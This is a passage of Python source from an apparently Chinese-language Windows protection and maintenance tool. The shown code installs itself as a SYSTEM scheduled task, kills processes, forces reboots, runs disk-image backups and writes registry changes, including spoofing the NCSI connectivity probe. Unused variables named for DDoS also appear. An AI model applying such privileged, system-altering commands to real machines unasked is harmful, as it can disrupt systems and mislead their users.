    global qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, setflag, pid
    try:
        if not os.path.isfile(force_out_files):
            with smart_open.smart_opens(
                force_out_files,
                "w",
            ) as f:
                f.write("1")
    except:
        pass
    if not qinstall:
        RunWrapper(
            'mshta vbscript:Msgbox("配置已保存,请等待程序初始化完成,窗口可能未响应,请耐心等待")(window.close)'
        )
    Create_Schtasks("Protect", ProtectExe, "", "SYSTEM", 2, 1)
    logger.log("启动Protect任务计划")
    RunWrapper("schtasks /Run /TN ZhangProtect\\Protect /I").read()
    RunWrapper("shutdown -r -t 60 -c ZhangProtect安装完毕将在一分钟后重启计算机").read()
    logger.log("程序安装完毕请检查任务计划程序")


def application_update():
    global qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, setflag, pid
    setflag = True
    RunWrapper(
        'mshta vbscript:Msgbox("正在更新程序,窗口可能未响应,请耐心等待")(window.close)'
    )
    try:
        logger.log("正在结束进程...")
        RunWrapper("schtasks /end /tn ZhangProtect\\Protect").read()
        disable_wmi = os.path.isfile(disable_Winmgmt)
        for i in dir_abs_bare(root=ProtectDir):
            name = os.path.basename(i).lower()
            name_no_exe = name.split(".")[:-1]
            if not name == self_process_name:
                RunWrapper(
                    f"Taskkill /f /im {name} {f"& powershell \"Get-Process -Name {name_no_exe} | Stop-Process -Force\"" if disable_wmi else ""}"
                )
        timeout = 0
        while not RunWrapper.all_completed():
            time.sleep(1)
            if timeout > 15:
                break
            timeout += 1
        # 先删除旧程序,无需Uninstall
        logger.log("正在移除旧的程序...")
        if os.path.isfile(ProtectExe):
            try:
                os.remove(ProtectExe)
                RunWrapper("cmd /c del /f /q /a " + ProtectExe).read()
            except Exception as e:
                logger.log(
                    str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                )
        if not os.path.exists(ProtectDir):
            os.makedirs(ProtectDir)
        logger.log("复制新的文件...")
        shutil.copyfile(selffullname, ProtectExe)
        logger.log("正在校验文件...")
        selfmd5 = getmd5(selffullname)
        promd5 = getmd5(ProtectExe)
        if os.path.isfile(disable_Winmgmt):
            RunWrapper(
                'taskkill /f /im mshta.exe /t & powershell "Get-Process -Name mshta | Stop-Process -Force" >nul 2>nul'
            ).read()
        else:
            RunWrapper("taskkill /f /im mshta.exe /t >nul 2>nul").read()
        if selfmd5 == promd5:
            if os.path.isfile(disable_Winmgmt):
                RunWrapper(
                    'cmd /c schtasks /End /TN ZhangProtect\\Protect & taskkill /f /im Protect.exe /t & powershell "Get-Process -Name Protect | Stop-Process -Force" & schtasks /Run /TN ZhangProtect\\Protect /I'
                ).read()
            else:
                RunWrapper(
                    "cmd /c schtasks /End /TN ZhangProtect\\Protect & taskkill /f /im Protect.exe /t & schtasks /Run /TN ZhangProtect\\Protect /I"
                ).read()
            try:
                if not os.path.isfile(force_out_files):
                    with smart_open.smart_opens(
                        force_out_files,
                        "w",
                    ) as f:
                        f.write("1")
            except:
                pass
            messagebox.showinfo(
                "完成",
                "更新完毕"
                + chr(10)
                + "请重启计算机来完成应用"
                + chr(10)
                + "md5校验值:"
                + str(promd5),
            )
        else:
            messagebox.showerror(
                "失败",
                "更新失败:md5校验未通过:"
                + chr(10)
                + "新版本md5:"
                + str(selfmd5)
                + chr(10)
                + "而已安装版本md5:"
                + str(promd5),
            )
        exit(0)
    except Exception as e:
        messagebox.showinfo(
            "失败",
            "更新失败:无法结束进程"
            + chr(10)
            + "请尝试退出安全软件或检查相应服务"
            + chr(10)
            + str(sys.exc_info())
            + "行:"
            + str(e.__traceback__.tb_lineno),
        )
        exit(0)


def reading_ini(readmode=False):
    global qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, setflag, proname0, tdir0, proname1, tdir1, tdir2, datadir, Onedriveupdatedir, autoshutdowntime, pronamesys, AllSchrun, AppRunA, AppRunB, AppRunC, Onedriveupdate, ztimeoutA, ztimeoutB, hidesettingflag, SystemVersion, wificonf
    try:
        logger.log("读取配置文件...")
        if os.path.isfile(Protectconf):
            # 从配置文件里面读取,并赋值给变量
            inilong = 11  # 配置文件长度(输入框数量,修改的时候上面输入框的也要改)
            with smart_open.smart_opens(
                Protectconf,
                "r",
            ) as f:
                a = f.read()
                allini = a.splitlines()[:inilong]
            if readmode:
                if not len(allini) == inilong:
                    return 0
                else:
                    return allini
            if not len(allini) == inilong:  # 检查配置文件,长度应与变量数一致
                try:
                    writing_conf(True)
                except Exception as e:
                    exit(0)
                return "reload"
            (
                proname0,
                tdir0,
                proname1,
                tdir1,
                tdir2,
                datadir,
                Onedriveupdatedir,
                autoshutdowntime,
                hidesettingflag,
                wificonf,
                DDOSConf,
            ) = allini
            hidesettingflag = str(hidesettingflag)
        else:
            try:
                writing_conf(True)
            except Exception as e:
                pass
            return "reload"
        if not proname0:
            proname0 = "explorer.exe"
        if not tdir0:
            tdir0 = "echo."
        if not proname1:
            proname1 = "explorer.exe"
        if not tdir1:
            tdir1 = "echo."
        if not tdir2:
            tdir2 = "echo."
        if not datadir:
            datadir = "D"
        if not Onedriveupdatedir:
            Onedriveupdatedir = "C:\\ProgramData\\OnedriveTest"
        if not autoshutdowntime:
            autoshutdowntime = "0"
        if not hidesettingflag:
            hidesettingflag = "1"
        if not wificonf:
            wificonf = "Windows-WiFi(1-8)-%s*12345678*1" % get_Identification_code()
        if not DDOSConf:
            DDOSConf = "Disable"
        if os.path.isdir(datadir + ":"):
            try:
                smart_open.KeepFolder(datadir + ":\\StorageRedirect", 0)
                smart_open.KeepFolder(datadir + ":\\StorageRedirect\\ProtectLogs", 0)
                logdir = datadir + ":\\StorageRedirect\\ProtectLogs\\"
                logger.log(f"配置读取完毕。日志目录转移到 {logdir}")
                if not os.path.isdir(logdir):
                    os.mkdir(logdir)
                config.log_dir = logdir
            except:
                datadir_restore = str(SystemDir[:-1])
                logger.log(
                    "由于 %s:\\ 无法写入,数据盘暂时修改为: %s:\\"
                    % (datadir, datadir_restore),
                )
                datadir = datadir_restore
        else:
            exit(0)
        logger.log(str(allini))
    except Exception as e:
        logger.log(
            "抛出错误在配置读取阶段"
            + str(sys.exc_info())
            + "行:"
            + str(e.__traceback__.tb_lineno),
        )
        exit(0)
    return True


def random_key(long):
    key = ""
    while not len(key) >= long:
        key += str(random.randrange(10))
    return key


def system_backup(datadir):
    def Backup_Stat(stat_log):
        System_Backup_Stat = (
            datadir + ":\\Important\\System_Backup\\System_Backup_Stat.log"
        )
        if not os.path.isfile(System_Backup_Stat):
            with smart_open.smart_opens(
                System_Backup_Stat,
                "w",
            ) as f:
                f.write(
                    "该文件自动系统备份日志文件,为及时备份系统镜像,需要占用一定硬盘空间"
                )
        with smart_open.smart_opens(
            System_Backup_Stat,
            "a",
        ) as g:
            g.write(
                chr(10)
                + "-" * 20
                + chr(10)
                + "[PID:"
                + str(os.getpid())
                + ",version:"
                + version
                + "]"
                + str(datetime.datetime.now())
                + str(stat_log)
                + "喵~"
            )
        logger.log(stat_log)

    SystemDrive = str(os.environ.get("systemdrive"))
    if SystemDrive == datadir + ":":
        Backup_Stat("数据盘路径与系统盘路径一致,禁止备份")
        return False
    Backup_Stat("系统备份线程启动")
    try:
        smart_open.KeepFolder(datadir + ":\\Important")
        Backup_Dir = datadir + ":\\Important\\System_Backup"
        smart_open.KeepFolder(Backup_Dir)
        Driver_Backup_Path = datadir + ":\\Important\\System_Backup\\Drivers_Backup"
        smart_open.KeepFolder(Driver_Backup_Path)
        System_Backup_Image = datadir + ":\\Important\\System_Backup\\System_Backup.sna"
        System_Backup_Image_full = System_Backup_Image
        hash_file = datadir + ":\\Important\\System_Backup\\System_Backup.hsh"
        No_System_Backup_flag = datadir + ":\\Important\\System_Backup\\nobackup"
        Create_Append_System_Backup_flag = (
            datadir + ":\\Important\\System_Backup\\newbackup"
        )
        System_Backup_flag = "nothing"
        Todaytime = str(datetime.date.today())
        if (os.path.isfile(Open_SystemBackup_Flag)) and (
            not os.path.isfile(No_System_Backup_flag)
        ):
            if (not os.path.isfile(daily_system_backup)) and os.path.isfile(
                System_Backup_Image
            ):
                Backup_Stat(
                    "根据策略,不执行自动增量备份,需要增量备份请打开 自动备份每天增量 开关"
                )
                return False
            system_clean_cmd_1 = "DISM /online /Cleanup-Image /StartComponentCleanup"
            system_clean_cmd_2 = CCleanerExe + " /AUTO"
            system_clean_cmd_3 = "sfc /scannow"
            system_clean_cmd_4 = "DISM /Online /Cleanup-Image /ScanHealth"
            system_clean_cmd_5 = "DISM /Online /Cleanup-image /RestoreHealth"
            Backup_Stat("执行系统清洁")
            RunWrapper(system_clean_cmd_2).read()
            Backup_Stat("系统清洁完成")
            Driver_Backup_Command = (
                "DISM /online /export-driver /destination:" + Driver_Backup_Path
            )
            # RunWrapper(Driver_Backup_Command).read()
            # Backup_Stat("执行备份系统驱动:" + Driver_Backup_Command)
            # SystemRestorePointCreationFrequency_Command = (
            #     'powershell Checkpoint-Computer -Description "'
            #     + str(datetime.datetime.now()).replace(" ", "-")
            #     + '自动创建"'
            # )
            # SystemRestore_Result = RunWrapper(
            #     SystemRestorePointCreationFrequency_Command
            # ).read()
            # Backup_Stat(
            #     "自动创建系统还原点:"
            #     + SystemRestorePointCreationFrequency_Command
            #     + ":"
            #     + SystemRestore_Result,
            # )
            System_Backup_Date = (
                datadir + ":\\Important\\System_Backup\\System_Backup_Date.txt"
            )
            while True:
                if os.path.isfile(System_Backup_Image):
                    if os.path.isfile(System_Backup_Date):
                        with smart_open.smart_opens(
                            System_Backup_Date,
                            "r",
                        ) as f:
                            Image_Time = str(f.read())
                        with smart_open.smart_opens(
                            System_Backup_Date,
                            "w",
                        ) as f:
                            f.write(Todaytime)
                    else:
                        Image_Time = "1970-01-01"
                        with smart_open.smart_opens(
                            System_Backup_Date,
                            "w",
                        ) as f:
                            f.write(Todaytime)
                    Test_Image_Command = (
                        '"' + SnapShotExe + '" "' + System_Backup_Image + '" -T'
                    )
                    Test_Image = str(RunWrapper(Test_Image_Command).read())
                    if ("Some error occurred" in Test_Image) or (
                        not os.path.isfile(hash_file)
                    ):  # 对已存在的镜像进行校验,通过就判断今天是否备份过,不通过立即创建新备份
                        System_Backup_flag = "new"
                        RunWrapper('del /f /q /a "' + Backup_Dir + '\\*.*"').read()
                        Backup_Stat("系统备份校验不通过,重新备份:" + Test_Image)
                        continue
                    else:
                        Backup_Stat("系统备份校验通过:" + Test_Image)
                        if not Todaytime == Image_Time:
                            System_Backup_flag = "add"
                        else:
                            System_Backup_flag = "nothing"
                            Backup_Stat("系统今天已经备份过了:" + Image_Time)
                            break
                else:
                    System_Backup_flag = "new"
                    Backup_Stat(
                        "备份不存在,创建一个新的系统备份:" + System_Backup_Image
                    )
                if os.path.isfile(Create_Append_System_Backup_flag):  # 强制差异备份
                    System_Backup_flag = "add"
                    os.remove(Create_Append_System_Backup_flag)
                    Backup_Stat("检测到标志,强制执行差异备份:" + System_Backup_Image)
                try:
                    if System_Backup_flag == "add":
                        with smart_open.smart_opens(
                            System_Backup_Date,
                            "w",
                        ) as f:
                            f.write(Todaytime)
                        System_Backup_Image = (
                            datadir
                            + ":\\Important\\System_Backup\\System_Backup_Add_"
                            + str(Todaytime)
                            + ".sna"
                        )
                        new_hsh_cmd = (
                            SnapShotExe
                            + " "
                            + System_Backup_Image_full
                            + " -h"
                            + hash_file
                        )
                        Backup_Stat("生成新哈希文件:" + new_hsh_cmd)
                        new_hsh_cmd_result = RunWrapper(new_hsh_cmd).read()
                        Backup_Stat(
                            "生成新哈希文件操作成功完成:"
                            + new_hsh_cmd_result.splitlines()[-1]
                        )
                        while os.path.isfile(System_Backup_Image):
                            System_Backup_Image = (
                                datadir
                                + ":\\Important\\System_Backup\\System_Backup_Add_"
                                + str(Todaytime)
                                + "-"
                                + str(random.randrange(1, 2048576))
                                + ".sna"
                            )
                        Add_Image_Command = (
                            SnapShotExe
                            + " %systemdrive% "
                            + System_Backup_Image
                            + " -R -L0 -h"
                            + hash_file
                        )
                        Backup_Stat("执行差异备份系统:" + Add_Image_Command)
                        backup_result = RunWrapper(Add_Image_Command).read()
                        Backup_Stat("差异备份操作成功完成" + str(backup_result))
                        Test_Image_Command = (
                            '"' + SnapShotExe + '" "' + System_Backup_Image + '" -T'
                        )
                        Test_Image = str(RunWrapper(Test_Image_Command).read())
                        if ("Some error occurred" in Test_Image) or (
                            not os.path.isfile(hash_file)
                        ):
                            os.remove(System_Backup_Image)
                            Backup_Stat("差异备份校验不通过,重新备份:" + Test_Image)
                            continue
                        else:
                            Backup_Stat("差异备份已完成,系统备份校验通过" + Test_Image)
                            break
                    elif System_Backup_flag == "new":
                        with smart_open.smart_opens(
                            System_Backup_Date,
                            "w",
                        ) as f:
                            f.write(Todaytime)
                        New_Image_Command = (
                            SnapShotExe
                            + " %systemdrive% "
                            + System_Backup_Image
                            + " -R -L0"
                        )
                        Backup_Stat("执行完整备份系统:" + New_Image_Command)
                        backup_result = RunWrapper(New_Image_Command).read()
                        Backup_Stat("完整备份操作成功完成" + str(backup_result))
                        Test_Image_Command = (
                            '"' + SnapShotExe + '" "' + System_Backup_Image + '" -T'
                        )
                        Test_Image = str(RunWrapper(Test_Image_Command).read())
                        if ("Some error occurred" in Test_Image) or (
                            not os.path.isfile(hash_file)
                        ):  # 对已存在的镜像进行校验,通过就判断今天是否备份过,不通过立即创建新备份
                            System_Backup_flag = "new"
                            RunWrapper('del /f /q /a "' + Backup_Dir + '\\*.*"').read()
                            Backup_Stat("系统备份校验不通过,重新备份:" + Test_Image)
                            continue
                        else:
                            Backup_Stat("系统备份校验通过:" + Test_Image)
                        new_hsh_cmd = (
                            SnapShotExe
                            + " "
                            + System_Backup_Image_full
                            + " -h"
                            + hash_file
                        )
                        Backup_Stat("生成新哈希文件:" + new_hsh_cmd)
                        new_hsh_cmd_result = RunWrapper(new_hsh_cmd).read()
                        Backup_Stat(
                            "生成新哈希文件操作成功完成:"
                            + new_hsh_cmd_result.splitlines()[-1]
                        )
                        break
                except Exception as e:
                    Backup_Stat(
                        "错误:自动备份异常退出:"
                        + str(sys.exc_info())
                        + "行:"
                        + str(e.__traceback__.tb_lineno)
                    )
            Backup_Stat("自动备份操作成功完成")
            return True
        else:
            Backup_Stat("自动备份退出:策略设置禁止执行自动备份")
            return False
    except Exception as e:
        Backup_Stat(
            "错误:自动备份异常退出:"
            + str(sys.exc_info())
            + "行:"
            + str(e.__traceback__.tb_lineno)
        )
        return False


def define():
    global qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, proname0, tdir0, proname1, tdir1, tdir2, datadir, Onedriveupdatedir, autoshutdowntime, pronamesys, AllSchrun, AppRunA, AppRunB, AppRunC, Onedriveupdate, ztimeoutA, ztimeoutB, hidesettingflag, SystemVersion, SystemVersion, wificonf
    try:
        try:
            if os.path.isfile(disablehibernate):
                if os.path.isfile(usehibernate):
                    os.remove(usehibernate)
        except:
            pass
        try:
            clear_runas_schtasks()
        except:
            pass
        Create_All_Schtasks()
        if os.path.isfile(Open_SystemBackup_Flag):
            System_Backup_Pro = threading.Thread(target=system_backup, args=(datadir,))
            System_Backup_Pro.start()
            logger.log("根据策略设置,创建自动备份线程")
        if os.path.isfile(use_network_balance) and not os.path.isfile(disable_Winmgmt):
            NetWorkAdapter_Load_Balance_pro = threading.Thread(
                target=NetWorkAdapter_Load_Balance
            )
            NetWorkAdapter_Load_Balance_pro.start()
            logger.log("根据策略设置,创建多网络适配器均衡线程")
        else:
            Remove_NetSwitchTeam()
        ztimeoutA = 0
        ztimeoutB = 0
        if os.path.isfile(Unique_identification_code_txt):
            with smart_open.smart_opens(
                Unique_identification_code_txt,
                "r",
            ) as f:
                Unique_identification_code = f.read()
        else:
            Unique_identification_code = get_Identification_code()
            with smart_open.smart_opens(
                Unique_identification_code_txt,
                "w",
            ) as f:
                f.write(str(Unique_identification_code))
        if len(str(Unique_identification_code)) > 6:
            Unique_identification_code_pwd = Unique_identification_code[:6:]
        else:
            Unique_identification_code_pwd = Unique_identification_code
        pronamesys = "cmd.exe"
        ncsifix = str(ProtectDir).replace("\\", "/")
        ncsiurl = "file:///" + ncsifix
        ncsiurl = ncsiurl[:-1:]
        wificonf = wificonf.split("*")
        wifibd = wificonf[2]
        global wifiid, wifipw
        if os.path.isfile(randomwifissid):
            wifiid = random_key(8)
        else:
            wifiid = wificonf[0]
        if os.path.isfile(randomwifipwd):
            wifipw = random_key(8)
        else:
            wifipw = wificonf[1]
        random_wifi_conf = ""
        if os.path.isfile(randomwifissid) or os.path.isfile(randomwifipwd):
            random_wifi_conf = (
                "本次随机的无线热点\n\nSSID : " + wifiid + "\n\n密码 : " + wifipw
            )
        Onedriveupdate = (
            Onedriveupdatedir
            + "\\OneDriveUpdateInduce"
            + str(datetime.datetime.now())
            .replace(" ", "-")
            .replace(":", "-")
            .replace(".", "-")
            + ".txt"
        )
        if hidesettingflag == "1":
            logger.log("增强模式开关标志为:" + str(hidesettingflag))
            hidesettingflag = "1"
            logger.log("增强模式开关为开")
        else:
            hidesettingflag = "0"
            logger.log("增强模式开关为关")
        systemappfixpow = (
            "Get-appxpackage -all *shellexperience* -packagetype bundle |% {add-appxpackage -register -disabledevelopmentmode ($_.installlocation +"
            + chr(34)
            + "appxmetADATAappxbundlemanifest.xml"
            + chr(34)
            + ")}"
        )
        regfixs = (
            "Windows Registry Editor Version 5.00"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\OneDrive]"
            + chr(10)
            + ""
            + chr(34)
            + "DisableFirstDeleteDialog"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "DisablePauseOnMeteredNetwork"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "DisablePauseOnBatterySaver"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "AllowDisablePermissionInheritance"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "GPOSetUpdateRing"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "KFMSilentOptInDesktop"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "KFMSilentOptInDocuments"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "KFMSilentOptInPictures"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "LocalMassDeleteFileDeleteThreshold"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "ForcedLocalMassDeleteDetection"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "WarningMinDiskSpaceLimitInMB"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "EnableHoldTheFile"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "EnableAllOcsiClients"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "DisableTutorial"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "PermitDisablePermissionInheritance"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "EnableAutomaticUploadBandwidthManagement"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "EnableSyncAdminReports"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "AutomaticUploadBandwidthPercentage"
            + chr(34)
            + "=dword:0000003c"
            + chr(10)
            + ""
            + chr(34)
            + "DisableAutoConfig"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "KFMBlockOptOut"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "KFMBlockOptIn"
            + chr(34)
            + "=dword:00000002"
            + chr(10)
            + ""
            + chr(34)
            + "BlockExternalSync"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\OneDrive\\EnableODIgnoreListFromGPO]"
            + chr(10)
            + ""
            + chr(34)
            + "*.sys"
            + chr(34)
            + "="
            + chr(34)
            + "*.sys"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.db"
            + chr(34)
            + "="
            + chr(34)
            + "*.db"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.dat"
            + chr(34)
            + "="
            + chr(34)
            + "*.dat"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.log"
            + chr(34)
            + "="
            + chr(34)
            + "*.log"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "downloads3.txt"
            + chr(34)
            + "="
            + chr(34)
            + "downloads3.txt"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.db-wal"
            + chr(34)
            + "="
            + chr(34)
            + "*.db-wal"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.db-shm"
            + chr(34)
            + "="
            + chr(34)
            + "*.db-shm"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.aodl"
            + chr(34)
            + "="
            + chr(34)
            + "*.aodl"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.otc"
            + chr(34)
            + "="
            + chr(34)
            + "*.otc"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.otc-shm"
            + chr(34)
            + "="
            + chr(34)
            + "*.otc-shm"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.otc-wal"
            + chr(34)
            + "="
            + chr(34)
            + "*.otc-wal"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*edge"
            + chr(34)
            + "="
            + chr(34)
            + "*edge"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*StorageRedirect"
            + chr(34)
            + "="
            + chr(34)
            + "*StorageRedirect"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*onedrive*"
            + chr(34)
            + "="
            + chr(34)
            + "*onedrive*"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.odlsent"
            + chr(34)
            + "="
            + chr(34)
            + "*.odlsent"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*.odlgz"
            + chr(34)
            + "="
            + chr(34)
            + "*.odlgz"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "*SyncEngine*"
            + chr(34)
            + "="
            + chr(34)
            + "*SyncEngine*"
            + chr(34)
            + ""
        )
        intefix = (
            "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NlaSvc\\Parameters\\Internet]"
            + chr(10)
            + ""
            + chr(34)
            + "ActiveDnsProbeContent"
            + chr(34)
            + "="
            + chr(34)
            + ncsiurl
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveDnsProbeContentV6"
            + chr(34)
            + "="
            + chr(34)
            + ncsiurl
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveDnsProbeHost"
            + chr(34)
            + "="
            + chr(34)
            + ncsiurl
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveDnsProbeHostV6"
            + chr(34)
            + "="
            + chr(34)
            + ncsiurl
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveWebProbeContent"
            + chr(34)
            + "="
            + chr(34)
            + "Microsoft NCSI联网测试"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveWebProbeContentV6"
            + chr(34)
            + "="
            + chr(34)
            + "Microsoft NCSI联网测试"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveWebProbeHost"
            + chr(34)
            + "="
            + chr(34)
            + ncsiurl
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveWebProbeHostV6"
            + chr(34)
            + "="
            + chr(34)
            + ncsiurl
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveWebProbePath"
            + chr(34)
            + "="
            + chr(34)
            + "ncsi.txt"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "ActiveWebProbePathV6"
            + chr(34)
            + "="
            + chr(34)
            + "ncsi.txt"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "CaptivePortalTimer"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "CaptivePortalTimerBackOffIncrementsInSeconds"
            + chr(34)
            + "=dword:00000005"
            + chr(10)
            + ""
            + chr(34)
            + "CaptivePortalTimerMaxInSeconds"
            + chr(34)
            + "=dword:0000001e"
            + chr(10)
            + ""
            + chr(34)
            + "EnableActiveProbing"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "PassivePollPeriod"
            + chr(34)
            + "=dword:0000000f"
            + chr(10)
            + ""
            + chr(34)
            + "StaleThreshold"
            + chr(34)
            + "=dword:0000001e"
            + chr(10)
            + ""
            + chr(34)
            + "WebTimeout"
            + chr(34)
            + "=dword:00000023"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management]"
            + chr(10)
            + ""
            + chr(34)
            + "ClearPageFileAtShutdown"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "DisablePagingExecutive"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "LargeSystemCache"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "NonPagedPoolQuota"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "NonPagedPoolSize"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "PagedPoolQuota"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "PagedPoolSize"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "SecondLevelDataCache"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "SessionPoolSize"
            + chr(34)
            + "=dword:00000004"
            + chr(10)
            + ""
            + chr(34)
            + "SessionViewSize"
            + chr(34)
            + "=dword:00000030"
            + chr(10)
            + ""
            + chr(34)
            + "SystemPages"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "PhysicalAddressExtension"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "FeatureSettings"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "UseOverlay"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters]"
            + chr(10)
            + ""
            + chr(34)
            + "BootId"
            + chr(34)
            + "=dword:0000009e"
            + chr(10)
            + ""
            + chr(34)
            + "BaseTime"
            + chr(34)
            + "=dword:29855fd6"
            + chr(10)
            + ""
            + chr(34)
            + "EnablePrefetcher"
            + chr(34)
            + "=dword:00000003"
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl]"
            + chr(10)
            + ""
            + chr(34)
            + "AutoReboot"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "CrashDumpEnabled"
            + chr(34)
            + "=dword:00000007"
            + chr(10)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "DumpLogLevel"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "EnableLogFile"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "LogEvent"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + chr(34)
            + "MinidumpsCount"
            + chr(34)
            + "=dword:00000005"
            + chr(10)
            + ""
            + chr(34)
            + "Overwrite"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "DumpFilters"
            + chr(34)
            + "=hex(7):64,00,75,00,6d,00,70,00,66,00,76,00,65,00,2e,00,73,00,79,\\"
            + chr(10)
            + "  00,73,00,00,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "PagefileTooSmall"
            + chr(34)
            + "=hex(b):4e,a4,42,6a,d0,7f,d9,01"
            + chr(10)
            + ""
            + chr(34)
            + "AlwaysKeepMemoryDump"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl\\FullLiveKernelReports]"
            + chr(10)
            + ""
            + chr(34)
            + "LastFullLiveReport"
            + chr(34)
            + "=hex(b):c0,3a,d3,d4,51,aa,d9,01"
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl\\FullLiveKernelReports\\NDIS]"
            + chr(10)
            + ""
            + chr(34)
            + "LastFullLiveReport"
            + chr(34)
            + "=hex(b):c0,3a,d3,d4,51,aa,d9,01"
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl\\LiveKernelReports]"
            + chr(10)
